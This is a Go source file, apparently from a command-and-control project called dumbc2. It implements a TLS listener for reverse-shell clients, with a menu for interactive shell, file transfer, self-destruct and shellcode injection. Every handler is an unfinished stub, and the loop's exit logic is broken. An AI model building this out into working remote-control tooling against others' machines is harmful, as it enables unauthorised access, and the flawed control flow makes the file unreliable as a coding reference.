package useri

import (
	"fmt"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"log"
	"net"
	"strconv"
	"strings"
	"time"
)

func StartServer(userOP config.UserOperation) {
	fladdr := userOP.ListenAddr
    lbserver, err := transport.TLSServerBuilder(fladdr, false)
    if err != nil {
    	panic(err)
	}
    for true {
    	if lbserver != nil {
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
			handleClient(conn)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}


func printHelp(){
	fmt.Println(
`
Usage: 
bash = Get Shell (Interactive)
upload <Source File Path> <Destination File Path> = Upload file
download <Source File Path> <Destination File Path> = Download file
boom = Self-Destroy
exit = Close Program
help = Show This Message
inject <BASE64-Encoded Code> = Execute Shell Code
`)
}

func handleClient(conn net.Conn){
	// start as tls server, means it's a reverse shell
	printHelp()
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
	for true {
		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		switch useriptD[0] {
		case "upload":
			//todo: build rtcommand and send
		case "download":
			//todo
		case "boom":
			//todo
			break
		case "bash":
			//todo
		case "inject":
			//todo
		case "exit":
			break
		case "help":
			fallthrough
		default:
			printHelp()
		}
	}
	_ = conn.Close()
}
